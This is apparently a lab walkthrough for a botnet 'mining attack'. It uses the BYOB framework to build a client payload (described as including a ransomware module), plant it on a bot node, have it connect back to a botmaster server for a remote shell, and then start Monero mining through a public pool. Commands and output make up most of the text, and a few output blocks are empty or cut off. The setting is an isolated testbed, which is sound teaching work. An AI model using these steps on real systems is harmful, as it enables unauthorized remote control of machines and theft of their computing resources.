## Mining Attack
Botmaster (`botmaster` in our case) uses bot nodes (`b1` in our case)to mine Monero cryptocurrency. 

### Connection with client

We will use the `botmaster` node to generate a client. The client will have a ransomware
module built into it.

SSH to the botmaster node from your XDC
```shell
ssh botmaster
```

```shell
cd /opt/byob/byob.git/byob
python3 client.py --freeze botmaster.infra 1337 miner
```
The output should look like this:

```shell


88                                  88
88                                  88
88                                  88
88,dPPYba,  8b       d8  ,adPPYba,  88,dPPYba,
88P'    "8a `8b     d8' a8"     "8a 88P'    "8a
88       d8  `8b   d8'  8b       d8 88       d8
88b,   ,a8"   `8b,d8'   "8a,   ,a8" 88b,   ,a8"
8Y"Ybbd8"'      Y88'     `"YbbdP"'  8Y"Ybbd8"'
                d8'
               d8'

```

We now scp this module to our home directory on the client (for example, `b1`):
```shell
scp dist/jIJ b1.infra:
```

Lastly, startup the server
```shell
python3 -u server.py
```
The server should start and should start a prompt as follows:

```shell
88                                  88
88                                  88

8Y"Ybbd8"'      Y88'     `"YbbdP"'  8Y"Ybbd8"'
                d8'
               d8'


[?]  Hint: show usage information with the 'help' command

[rishitsaiya @ /opt/byob/byob]>
```

Parallely, SSH to the b1 node from your XDC through different terminal
```shell
ssh b1
```
Execute the payload from here
```shell
./jIJ
```

At this point, the server should display a message like:
```shell
[+] Connection: 172.30.0.11
    Session: 0
    Started: Wed Nov  8 20:34:50 2023
```

Connect with the bot node using
```shell
shell 0
```
You can verify the socket connection by typing `ls` at prompt in server to check.

#### Monero Blockchain Synchronization
Before the actual mining starts, the blockchain consisting of Monero Ledger needs to be synchronized. This is of a significant size and can take hours to fetch onto our node. It is to be noted that the entire mining environment setup will be done on `b1` node, because it is the node which does the actual mining. The environment setup is done with these references - [Documentation](https://www.getmonero.org/resources/user-guides/verification-allos-advanced.html) & [Walkthrough Video](https://youtu.be/wMY_Sx3o26k?si=n3eNpRYwcr-rGTRC).


#### Synchronization on b1 node
On `b1` node where the CLI is setup, type the command:

```shell
rishitsaiya@b1:~$ cd monero-x86_64-linux-gnu-v0.18.3.1/
rishitsaiya@b1:~$ sudo ./monerod --data-dir=. --log-file=monero.log
```

It should look something like as follows:
```bash

Note that it can take several hours. You can make this run in the background by adding `--detach` flag to the command mentioned above (not recommeded as you don't come to know about synchronization progress in real time and will have to navigate through the log for that.)

#### Monero Wallet Setup
After the synchronization is complete, the wallet is to be setup as follows:

```shell
rishitsaiya@b1:~/monero-x86_64-linux-gnu-v0.18.3.1$ ./monero-wallet-cli 
This is the command line monero wallet. It needs to connect to a monero
daemon to work correctly.
WARNING: Do not reuse your Monero keys on another fork, UNLESS this fork has key reuse mitigations built in. Doing so will harm your privacy.

Monero 'Fluorine Fermi' (v0.18.3.1-release)
Logging to ./monero-wallet-cli.log
Specify wallet file name (e.g., MyWallet). If the wallet doesn't exist, it will be created.
Wallet file name (or Ctrl-C to quit): discern
Wallet and key files found, loading...
Wallet password: 
```
After entering the password, the wallet prompt appears as follows:

```shell

```

The public address can be picked up from here. Other wallet commands can be used as refered in the [Monero Wallet Documentation](https://www.getmonero.org/resources/user-guides/monero-wallet-cli.html).

#### Joining a Mining Pool
Before the mining begins, you need to join a pool. For current demo, we have chosen [Hashvault Mining Pool](https://monero.hashvault.pro/en/getting-started).

#### Mining Instructions at the botmaster node
The mining can be made to start through the `botmaster` node with byob through the following command:

```shell
miner run pool.hashvault.pro 80 42Mt2HmeN9SfMsMqidujg...u8D
```
The mining starts here. The prompt on the botmaster node should look something like as follows:
```shell
[ 0 @ /home/rishitsaiya ]>miner run pool.hashvault.pro 80 42Mt2HmeN9SfMsMqidujg...u8D

Miner running in <Miner name='Miner-1' pid=30535 parent=30302 started>
```
**Note:** You may not see some monero accumulating immediately in your wallet balance, because it takes a lot of time to actually mine and collect these type of cryptocurrency. You can also join different pools to see if they can be used to mine currency quicker.

#### Appendix
There is a backup of the `lmdb/` on the XDC. `lmdb` is the monero transaction ledger database which acts as a database storage for the fetched blockchain up until when it was copied. It can be treated a backup recovery point and then can start synchronization again to avoid fetching the whole blockchain again. 

The command is used on **XDC** to mirror the image of database is as follows

```shell
rsync -a rishitsaiya@b1:/home/rishitsaiya monero-x86_64-linux-gnu-v0.18.3.1/lmdb /home/rishitsaiya/
```
The `lmdb` database can found at `/home/rishitsaiya/` location on XDC.
